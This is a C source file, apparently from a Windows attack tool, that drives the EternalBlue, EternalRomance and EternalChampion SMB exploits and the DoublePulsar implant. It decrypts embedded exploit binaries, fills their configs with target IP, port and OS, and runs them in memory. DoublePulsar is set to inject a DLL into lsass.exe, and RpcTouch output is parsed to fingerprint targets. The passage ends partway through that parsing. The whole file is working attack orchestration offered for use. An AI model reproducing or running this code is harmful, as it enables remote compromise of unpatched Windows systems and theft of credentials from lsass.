#include "attack.h"
#include "global.h"
#include "utils/MemoryModule.h"
#include "enc_res/smbtouch.h"
#include "enc_res/rpctouch.h"
#include "enc_res/namedpipetouch.h"
#include "enc_res/eternalromance.h"
#include "enc_res/eternalblue.h"
#include "enc_res/eternalchampion.h"
#include "enc_res/doublepulsar.h"
#include "enc_res/test.h"
#include "utils/load_exe.h"
#include "utils/op_pipe.h"
#include "utils/ex_string.h"

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

enum _implant_doublepulsar_ret_
{
    IMP_DOPU_SUCCESS = 0,
    IMP_DOPU_ERR_RD_CONF,
    IMP_DOPU_ERR_OP_CONF,
    IMP_DOPU_ERR_WR_CONF,
    IMP_DOPU_ERR_DECODE,
    IMP_DOPU_ERR_CRE_PIPE,
    IMP_DOPU_ERR_CRE_PROC,
    IMP_DOPU_ERR_NO_RES,
    IMP_DOPU_ERR_CONN,
    IMP_DOPU_ERR_FAILED,
};
int implant_doublepulsar(TARGET_DESC *pTargetDesc, char *pFuncType)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    int recvBufSize = 0;
    char osArch[100];
    char confFileBuf[6000];
    char confFilePath[MAX_PATH];
    char dllPath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(osArch, 0x00, sizeof(osArch));
    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));
    memset(dllPath, 0x00, sizeof(dllPath));

    //读取配置文件
    inFile = fopen("Doublepulsar-1.3.1.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return IMP_DOPU_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return IMP_DOPU_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return IMP_DOPU_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return IMP_DOPU_ERR_OP_CONF;
    }
    if(strcmp(pTargetDesc->osArch, "x86") !=0 &&
            strcmp(pTargetDesc->osArch, "x64") != 0)
    {
        //尚未检测到目标系统架构
        strcat(osArch, "x86");
    }
    else
    {
        strcat(osArch, pTargetDesc->osArch);
    }
    if(replace_str(confFileBuf, "_Target_Arch_", osArch) != 0)
    {
        printf("[-] Did not match the substring: _Target_Arch_\n");
        return IMP_DOPU_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Function_", pFuncType) != 0)
    {
        printf("[-] Did not match the substring: _Function_\n");
        return IMP_DOPU_ERR_OP_CONF;
    }
    sprintf(dllPath, "bd_%s.dll", osArch);
    if(replace_str(confFileBuf, "_DLL_Path_", dllPath) != 0)
    {
        printf("[-] Did not match the substring: _DLL_Path_\n");
        return IMP_DOPU_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Inject_Process_", "lsass.exe") != 0)
    {
        printf("[-] Did not match the substring: _Inject_Process_\n");
        return IMP_DOPU_ERR_OP_CONF;
    }

    //Get Doublepulsar
    encResDesc = get_doublepulsar();
    if(encResDesc.status != 0)
    {
        printf("[-] Get Doublepulsar failed. ErrCode: %d\n", encResDesc.status);
        return IMP_DOPU_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return IMP_DOPU_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "Doublepulsar-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return IMP_DOPU_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return IMP_DOPU_ERR_WR_CONF;
    }
    fclose(outFile);

    //启动EternalRomance
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load Doublepulsar failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return IMP_DOPU_ERR_CRE_PROC;
    }

    printf("[+] Doublepulsar Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 300);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] Doublepulsar did not return results.\n");
        return IMP_DOPU_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        if(strstr(pRecvBuf, "Failed to establish connection") != NULL)
            return IMP_DOPU_ERR_CONN;
        return IMP_DOPU_ERR_FAILED;
    }
    if(strcmp(pFuncType, "Ping") == 0)
    {
        pTmp = strstr(pRecvBuf, "architecture");
        if(pTmp != NULL)
        {
            if(strstr(pTmp, "x86") != NULL)
            {
                memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
                strcat(pTargetDesc->osArch, "x86");
                printf("[+] Confirm target OS architecture: x86\n");
            }
            else if(strstr(pTmp, "x64") != NULL)
            {
                memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
                strcat(pTargetDesc->osArch, "x64");
                printf("[+] Confirm target OS architecture: x64\n");
            }
        }
    }

    return IMP_DOPU_SUCCESS;
}

enum _exp_eternalromance_ret_
{
    EXP_ETROM_SUCCESS = 0,
    EXP_ETROM_ERR_RD_CONF,
    EXP_ETROM_ERR_OP_CONF,
    EXP_ETROM_ERR_WR_CONF,
    EXP_ETROM_ERR_DECODE,
    EXP_ETROM_ERR_CRE_PIPE,
    EXP_ETROM_ERR_CRE_PROC,
    EXP_ETROM_ERR_NO_RES,
    EXP_ETROM_ERR_FAILED,
};
int exp_eternalromance(TARGET_DESC *pTargetDesc)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    int recvBufSize = 0;
    char expMethod[100];
    char confFileBuf[20000];
    char confFilePath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(expMethod, 0x00, sizeof(expMethod));
    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));

    //读取配置文件
    inFile = fopen("Eternalromance-1.4.0.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return EXP_ETROM_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return EXP_ETROM_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_OS_", pTargetDesc->osVer) != 0)
    {
        printf("[-] Did not match the substring: _Target_OS_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Pipe_Name_", pTargetDesc->pipeName) != 0)
    {
        printf("[-] Did not match the substring: _Pipe_Name_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Shellcode_File_", "sc.bin") != 0)
    {
        printf("[-] Did not match the substring: _Shellcode_File_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }
    if(strstr(pTargetDesc->osVer, "2003") != NULL ||
            strstr(pTargetDesc->osVer, "XP") != NULL)
    {
        strcat(expMethod, "Fish-in-a-barrel");
    }
    else if(strstr(pTargetDesc->osVer, "WIN7") != NULL ||
            strstr(pTargetDesc->osVer, "2008R2") != NULL)
    {
        strcat(expMethod, "Matched-pairs");
    }
    else
    {
        strcat(expMethod, "Default");
    }
    if(replace_str(confFileBuf, "_Exploit_Method_", expMethod) != 0)
    {
        printf("[-] Did not match the substring: _Exploit_Method_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Proto_Type_", pTargetDesc->proto) != 0)
    {
        printf("[-] Did not match the substring: _Proto_Type_\n");
        return EXP_ETROM_ERR_OP_CONF;
    }

    //Get EternalRomance
    encResDesc = get_eternalromance();
    if(encResDesc.status != 0)
    {
        printf("[-] Get EternalRomance failed. ErrCode: %d\n", encResDesc.status);
        return EXP_ETROM_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return EXP_ETROM_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "Eternalromance-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return EXP_ETROM_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return EXP_ETROM_ERR_WR_CONF;
    }
    fclose(outFile);

    //启动EternalRomance
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load EternalRomance failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return EXP_ETROM_ERR_CRE_PROC;
    }

    printf("[+] EternalRomance Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 300);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] EternalRomance did not return results.\n");
        return EXP_ETROM_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        return EXP_ETROM_ERR_FAILED;
    }

    pTmp = strstr(pRecvBuf, "TargetOsArchitecture");
    if(pTmp != NULL)
    {
        if(strstr(pTmp, "x86") != NULL)
        {
            memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
            strcat(pTargetDesc->osArch, "x86");
            printf("[+] Confirm target OS architecture: x86\n");
        }
        else if(strstr(pTmp, "x64") != NULL)
        {
            memset(pTargetDesc->osArch, 0x00, sizeof(pTargetDesc->osArch));
            strcat(pTargetDesc->osArch, "x64");
            printf("[+] Confirm target OS architecture: x64\n");
        }
    }

    return EXP_ETROM_SUCCESS;
}

enum _exp_eternalchampion_ret_
{
    EXP_ETCHA_SUCCESS = 0,
    EXP_ETCHA_ERR_RD_CONF,
    EXP_ETCHA_ERR_OP_CONF,
    EXP_ETCHA_ERR_WR_CONF,
    EXP_ETCHA_ERR_DECODE,
    EXP_ETCHA_ERR_CRE_PIPE,
    EXP_ETCHA_ERR_CRE_PROC,
    EXP_ETCHA_ERR_NO_RES,
    EXP_ETCHA_ERR_FAILED,
};
int exp_eternalchampion(TARGET_DESC *pTargetDesc)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    int recvBufSize = 0;
    char confFileBuf[20000];
    char confFilePath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));

    //读取配置文件
    inFile = fopen("Eternalchampion-2.0.0.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return EXP_ETCHA_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return EXP_ETCHA_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return EXP_ETCHA_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return EXP_ETCHA_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_OS_", pTargetDesc->osVer) != 0)
    {
        printf("[-] Did not match the substring: _Target_OS_\n");
        return EXP_ETCHA_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Proto_Type_", pTargetDesc->proto) != 0)
    {
        printf("[-] Did not match the substring: _Proto_Type_\n");
        return EXP_ETCHA_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Arch_", pTargetDesc->osArch) != 0)
    {
        printf("[-] Did not match the substring: _Target_Arch_\n");
        return EXP_ETCHA_ERR_OP_CONF;
    }

    //Get EternalChampion
    encResDesc = get_eternalchampion();
    if(encResDesc.status != 0)
    {
        printf("[-] Get EternalChampion failed. ErrCode: %d\n", encResDesc.status);
        return EXP_ETCHA_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return EXP_ETCHA_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "EternalChampion-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return EXP_ETCHA_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return EXP_ETCHA_ERR_WR_CONF;
    }
    fclose(outFile);

    //EternalChampion
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load EternalChampion failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return EXP_ETCHA_ERR_CRE_PROC;
    }

    printf("[+] EternalChampion Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 300);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] EternalChampion did not return results.\n");
        return EXP_ETCHA_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        return EXP_ETCHA_ERR_FAILED;
    }

    return EXP_ETCHA_SUCCESS;
}

enum _exp_eternalblue_ret_
{
    EXP_ETBL_SUCCESS = 0,
    EXP_ETBL_ERR_RD_CONF,
    EXP_ETBL_ERR_OP_CONF,
    EXP_ETBL_ERR_WR_CONF,
    EXP_ETBL_ERR_DECODE,
    EXP_ETBL_ERR_CRE_PIPE,
    EXP_ETBL_ERR_CRE_PROC,
    EXP_ETBL_ERR_NO_RES,
    EXP_ETBL_ERR_FAILED,
};
int exp_eternalblue(TARGET_DESC *pTargetDesc)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    int recvBufSize = 0;
    char osVer[100];
    char confFileBuf[20000];
    char confFilePath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(osVer, 0x00, sizeof(osVer));
    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));

    //读取配置文件
    inFile = fopen("Eternalblue-2.2.0.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return EXP_ETBL_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return EXP_ETBL_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return EXP_ETBL_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return EXP_ETBL_ERR_OP_CONF;
    }
    if(strstr(pTargetDesc->osVer, "XP") != NULL)
    {
        strcat(osVer, "XP");
    }
    else
    {
        strcat(osVer, "WIN72K8R2");
    }
    if(replace_str(confFileBuf, "_Target_OS_", osVer) != 0)
    {
        printf("[-] Did not match the substring: _Target_OS_\n");
        return EXP_ETBL_ERR_OP_CONF;
    }

    //Get EternalBlue
    encResDesc = get_eternalblue();
    if(encResDesc.status != 0)
    {
        printf("[-] Get EternalBlue failed. ErrCode: %d\n", encResDesc.status);
        return EXP_ETBL_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return EXP_ETBL_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "Eternalblue-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return EXP_ETBL_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return EXP_ETBL_ERR_WR_CONF;
    }
    fclose(outFile);

    //启动EternalBlue
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load EternalBlue failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return EXP_ETBL_ERR_CRE_PROC;
    }

    printf("[+] EternalBlue Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 300);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] EternalBlue did not return results.\n");
        return EXP_ETBL_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        return EXP_ETBL_ERR_FAILED;
    }

    return EXP_ETBL_SUCCESS;
}

enum _rpc_touch_ret_
{
    RPC_TOUCH_SUCCESS = 0,
    RPC_TOUCH_ERR_RD_CONF,
    RPC_TOUCH_ERR_OP_CONF,
    RPC_TOUCH_ERR_WR_CONF,
    RPC_TOUCH_ERR_DECODE,
    RPC_TOUCH_ERR_CRE_PIPE,
    RPC_TOUCH_ERR_CRE_PROC,
    RPC_TOUCH_ERR_NO_RES,
    RPC_TOUCH_ERR_PARSE,
    RPC_TOUCH_ERR_FAILED,
};
int rpc_touch(TARGET_DESC *pTargetDesc)
{
    ENC_RES_DESC encResDesc;
    ANONY_PIPE_DESC pipeDesc;
    int retVal;
    int pid;
    HANDLE hProc;
    char *pRecvBuf = NULL;
    char *pTmp = NULL;
    char *pSplit = NULL;
    int recvBufSize = 0;
    int idx;
    char osVer[100];
    char osSp[100];
    char osArch[100];
    char tempBuf[10240];
    char confFileBuf[6000];
    char *pStart = NULL;
    char *pEnd = NULL;
    char confFilePath[MAX_PATH];
    char cmdline[MAX_PATH + 50];
    char intBuf[100];
    int x86Pot = 0;
    int x64Pot = 0;
    FILE *inFile = NULL;
    FILE *outFile = NULL;

    memset(osVer, 0x00, sizeof(osVer));
    memset(osSp, 0x00, sizeof(osSp));
    memset(osArch, 0x00, sizeof(osArch));
    memset(tempBuf, 0x00, sizeof(tempBuf));
    memset(confFileBuf, 0x00, sizeof(confFileBuf));
    memset(confFilePath, 0x00, sizeof(confFilePath));
    memset(cmdline, 0x00, sizeof(cmdline));

    //读取配置文件
    inFile = fopen("Rpctouch-2.1.0.xml", "rb");
    if(inFile == NULL)
    {
        printf("[-] Failed to open the configuration file.\n");
        return RPC_TOUCH_ERR_RD_CONF;
    }
    if(fread(confFileBuf, sizeof(char), sizeof(confFileBuf) - 1, inFile) <= 0)
    {
        printf("[-] Failed to read the configuration file.\n");
        fclose(inFile);
        return RPC_TOUCH_ERR_RD_CONF;
    }
    fclose(inFile);

    if(replace_str(confFileBuf, "_Target_IP_", pTargetDesc->ip) != 0)
    {
        printf("[-] Did not match the substring: _Target_IP_\n");
        return RPC_TOUCH_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_Target_Port_", pTargetDesc->port) != 0)
    {
        printf("[-] Did not match the substring: _Target_Port_\n");
        return RPC_TOUCH_ERR_OP_CONF;
    }
    if(replace_str(confFileBuf, "_NetBIOS_Name_", "*SMBSERVER") != 0)
    {
        printf("[-] Did not match the substring: _NetBIOS_Name_\n");
        return RPC_TOUCH_ERR_OP_CONF;
    }

    //解密RpcTouch
    encResDesc = get_rpctouch();
    if(encResDesc.status != 0)
    {
        printf("[-] Get RpcTouch failed. ErrCode: %d\n", encResDesc.status);
        return RPC_TOUCH_ERR_DECODE;
    }

    //创建管道
    pipeDesc = create_anony_pipe_with_io();
    if(pipeDesc.status != 0)
    {
        printf("[-] Create pipe failed. ErrCode: %d\n", pipeDesc.status);
        return RPC_TOUCH_ERR_CRE_PIPE;
    }

    //输出配置文件
    sprintf(confFilePath, "Rpctouch-%s.xml", pTargetDesc->ip);
    outFile = fopen(confFilePath, "wb");
    if(outFile == NULL)
    {
        printf("[-] Failed to create the configuration file.\n");
        return RPC_TOUCH_ERR_WR_CONF;
    }
    if(fwrite(confFileBuf, sizeof(char), strlen(confFileBuf), outFile) <= 0)
    {
        fclose(outFile);
        remove(confFilePath);
        printf("[-] Failed to write the configuration file.\n");
        return RPC_TOUCH_ERR_WR_CONF;
    }
    fclose(outFile);

    //启动RpcTouch
    sprintf(cmdline, "--InConfig %s", confFilePath);
    retVal = fork_process(encResDesc.pBufAddr,
                          cmdline,
                          NULL, &pipeDesc.si, &pipeDesc.pi,
                          &pid, &hProc);
    if(retVal != 0)
    {
        printf("[-] Load RpcTouch failed. ErrCode: %d\n", retVal);
        remove(confFilePath);
        return RPC_TOUCH_ERR_CRE_PROC;
    }

    printf("[+] Rpc Touch Subprocess ID: %d\n", pid);
    full_recv_from_anony_pipe(&pipeDesc, &pRecvBuf, &recvBufSize, 100);
    terminal_process(hProc);
    close_anony_pipe(&pipeDesc);
    remove(confFilePath);
    if(pRecvBuf == NULL)
    {
        printf("[-] Rpc Touch did not return results.\n");
        return RPC_TOUCH_ERR_NO_RES;
    }

    pTmp = strstr(pRecvBuf, "<t:config");
    if(pTmp != NULL)
    {
        *pTmp = NULL;
    }
    puts(pRecvBuf);
    if(pTmp == NULL)
    {
        return RPC_TOUCH_ERR_FAILED;
    }

    //转换小写
    memcpy(pRecvBuf, lower_str(pRecvBuf), strlen(pRecvBuf));
    pTmp = strstr(pRecvBuf, "smb string");
    if(pTmp == NULL)
    {
        printf("[-] Not found \"SMB String\".\n");
        free(pRecvBuf);
        return RPC_TOUCH_ERR_PARSE;
    }

    //判断系统版本
    if(strstr(pTmp, "windows server") != NULL)
    {
        //目标是服务器
        strcat(osVer, "SERVER");
        if(strstr(pTmp, "2008") != NULL)
        {
            //SERVER_2008
            strcat(osVer, "_2008");
            if(strstr(pTmp, "r2") != NULL)
            {
                //SERVER_2008R2
                strcat(osVer, "R2");
            }
        }
        else if(strstr(pTmp, "2003") != NULL)
        {
            //SERVER_2003
            strcat(osVer, "_2003");
        }
        else if(strstr(pTmp, "2012") != NULL)
        {
            //SERVER_2012
            strcat(osVer, "_2K12");
        }
    }
    else if(strstr(pTmp, "2k3") != NULL)
    {
        //SERVER_2003
        strcat(osVer, "SERVER_2003");
    }
    else if(strstr(pTmp, "windows 7") != NULL || \
            strstr(pTmp, "win7") != NULL)
    {
        strcat(osVer, "WIN7");
    }
    else if(strstr(pTmp, "vista") != NULL)
    {
        strcat(osVer, "VISTA");
    }
    else if(strstr(pTmp, "windows 8") != NULL)
    {
        strcat(osVer, "WIN8");
    }
    else if(strstr(pTmp, "windows") != NULL || \
            strstr(pTmp, "xp") != NULL)
    {
        strcat(osVer, "XP");
    }
    else
    {
        printf("[-] Unable to confirm system version.\n");
        free(pRecvBuf);
        return RPC_TOUCH_ERR_PARSE;
    }

    //判断目标系统补丁类型
    if(strstr(pTmp, "service pack 1") != NULL || strstr(pTmp, "sp1") != NULL)
    {
        strcat(osSp, "SP1");
    }
    else if(strstr(pTmp, "service pack 2") != NULL || strstr(pTmp, "sp2") != NULL)
    {
        strcat(osSp, "SP2");
    }
    else if(strstr(pTmp, "service pack 3") != NULL || strstr(pTmp, "sp3") != NULL)
    {
        strcat(osSp, "SP3");
    }
    else
    {
        strcat(osSp, "SP0");
    }

    //判断目标架构
    pTmp = strstr(pRecvBuf, "detected architecture");
    if(pTmp != NULL)
    {
        if(strstr(pTmp, "32-bit") != NULL || \
                strstr(pTmp, "x86") != NULL)
        {
            //x86 Architecture
            strcat(osArch, "x86");
        }
        else if(strstr(pTmp, "64-bit") != NULL || \
                strstr(pTmp, "x64") != NULL)
        {
            //x64 Architecture
            strcat(osArch, "x64");
        }
    }
    if(strlen(osArch) <= 0)
    {
        pTmp = strstr(pRecvBuf, "memory leak stats");
        if(pTmp == NULL)
        {
            strcat(osArch, "Unknown");
        }
        else
        {
            strcat(tempBuf, pTmp);
            pSplit = strtok(tempBuf, "\n");
            while(pSplit != NULL)
            {
                pEnd = strstr(pSplit, "potential");
                if(pEnd != NULL)
                {
                    for(pStart = pSplit; \
                            !(*pStart >= '0' && *pStart <= '9') && pStart != pEnd; \
                            pStart++);
                    if(pStart == pEnd)
                    {
                        printf("[-] Target OS architecture failure to judge.\n");
                        return RPC_TOUCH_ERR_PARSE;
                    }
                    for(pEnd = pStart; \
                            *pEnd >= '0' && *pEnd <= '9' && *pEnd != NULL; \
                            pEnd++);
                    if(*pEnd == NULL || (pEnd - pStart > sizeof(intBuf) -1))
                    {
                        printf("[-] Target OS architecture failure to judge.\n");
                        return RPC_TOUCH_ERR_PARSE;
                    }
                    memcpy(intBuf, pStart, pEnd - pStart);
                    if(strstr(pSplit, "x86") != NULL)
                        x86Pot = atoi(intBuf);
                    else if(strstr(pSplit, "x64") != NULL)
                        x64Pot = atoi(intBuf);
                    else
                    {
                        printf("[-] Target OS architecture failure to judge.\n");
                        return RPC_TOUCH_ERR_PARSE;
                    }
                }
                pSplit = strtok(NULL, "\n");
            }
            if(x86Pot >= x64Pot)
                strcat(osArch, "x86");
            else
                strcat(osArch, "x64");
        }
    }

    if(strcmp(osVer, "XP") == 0)
    {
        if(strcmp(osArch, "x86") == 0)
        {
            if(strcmp(osSp, "SP0") == 0 || strcmp(osSp, "SP1") == 0)
            {
                strcat(pTargetDesc->osVer, "XP_SP0SP1_X86;XP_SP2SP3_X86");
            }
            else
            {
                strcat(pTargetDesc->osVer, "XP_SP2SP3_X86;XP_SP0SP1_X86");
            }
        }
        else if(strcmp(osArch, "x64") == 0)
        {
            if(strcmp(osSp, "SP0") != 0)
            {
                strcat(pTargetDesc->osVer, osVer);
                strcat(pTargetDesc->osVer, "_");
                strcat(pTargetDesc->osVer, osSp);
                strcat(pTargetDesc->osVer, "_");
                strcat(pTargetDesc->osVer, osArch);
            }
            else
            {
                strcat(pTargetDesc->osVer, "XP_SP1_X64;XP_SP2_X64");
            }
        }
        else
        {
            printf("[-] Unable to confirm XP system architecture.\n");
            strcat(pTargetDesc->osVer, "XP_SP2SP3_X86;XP_SP0SP1_X86;XP_SP1_X64;XP_SP2_X64");
        }
    }
    else
    {
